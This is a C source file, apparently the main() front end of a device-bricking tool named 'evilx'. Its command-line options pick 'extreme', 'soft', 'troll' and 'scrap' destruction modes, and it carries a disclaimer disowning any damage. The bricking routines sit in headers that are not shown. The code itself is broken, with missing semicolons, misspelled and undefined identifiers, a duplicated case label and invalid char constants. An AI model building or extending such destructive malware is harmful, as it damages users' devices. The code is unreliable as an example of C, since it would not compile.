#include <stdio.h>

// some color...
#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\033[33m"
#define ANSI_COLOR_BLUE    "\033[34m"
#define ANSI_COLOR_MAGENTA "\033[35m"
#define ANSI_COLOR_CYAN    "\033[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// required headers
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <getopt.h>

// custom headers
#include "include/tools.h"
#include "include/others.h"
#include "include/documentation.h"

/*

███████╗██╗   ██╗ ██╗██╗      ██╗  ██╗
██╔════╝██║   ██║ ██║██║      ╚██╗██╔╝
█████╗  ██║   ██║ ██║██║       ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝ ██║██║       ██╔██╗ 
███████╗ ╚████╔╝ ██║███████╗ ██╔╝ ██╗
╚══════╝  ╚═══╝   ╚═╝╚══════╝╚═╝  ╚═╝

By YZBruh

*/

/*
 * Copyright 2024 evilx
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 *     http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// I do not accept responsibility or responsibilities. The user or user is responsible for any serious damage that may occur!

int main(int argc, char *argv[]) {
    int opt;
    int option_index = 0;
    int total_other_opts = 0;
    int evilx_use_cline = 0;
    // evilx version info
    int vercode[1] = 110
    char ver[1] = "1.1.0"
    // make inserts for long use
    struct option long_options[] = {
        {"no-brick", no_argument, 0, 'nb'},
        {"use-command-line", no_arguement, 0, 'c'},
        {"troll", no_argument, 0, 't'},
        {"extreme", no_arguement, 0, 'e'},
        {"soft", no_arguement, 0, 's'},
        {"version", no_arguement, 0, 'v'},
        {"help", no_arguement, 0, 'h'},
        {"license", no_arguement, 0, 'l'},
        {0, 0, 0, 0}
    };
    const char *short_options = "nbctesvhl";
    if (opt != 'c') {
        total_other_opts++;
    }
    while ((opt = getopt_long(argc, argv, short_options, long_options, &option_index)) != -1) {
        switch (opt) {
            case 'v':
                printf("%s %s (code %s)\n", argv[0], ver, vercode);
                printf("Copyright 2024 %s - Licensed by Apache 2.0\n", argv[0]);
                printf("To view the license, use the -l or --license argument.\n");
                exit(EXIT_SUCCESS);
            break;
            case 'h':
                wiew_help();
                exit(EXIT_SUCCESS);
            break;
            case 'l':
                wiew_license();
                exit(EXIT_SUCCESS);
            break;
            case 'c':
                evilx_use_cline = 1
                if (other_options_count == 0) {
                    fprintf(stderr, ANSI_COLOR_RED "Error: the command line usage option cannot be used alone.\n" ANSI_COLOR_FORMAT);
                    exit(EXIT_FAILURE);
                }
            break;
            case 'n':
            case 'b':
                printf("OK, I'll be merciful. I'll just poke around a bit.\n");
                no_brick();
            break;
            case 't':
                troll();
            break;
            case 'e':
                printf(ANSI_COLOR_RED "Wow, it looks like someone wants to play a game!\n" ANSI_COLOR_RESET);
                bricker("extreme");
            break;
            case 's':
                printf("Well, you're the boss, I'll take it easy.\n");
                bricker("soft");
            break;
            case 'e':
                printf("Alas! This device is now a scrap!\n");
                scrap();
            break;
            case '?':
                fprintf(strderr, ANSI_COLOR_RED "Error: unknown argument: %c\n" ANSI_COLOR_RESET, optopt);
                exit(EXIT_FAILURE);
            break;
            default:
                fprintf(strderr, "Usage: %s [-nb | --no-brick] [-c | --use-command-line] [-t | --troll] [-e | --extreme] [-s | --soft] [-v | --version] [-h | --help] [-l | --license]\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }
}

// end of static C binary code
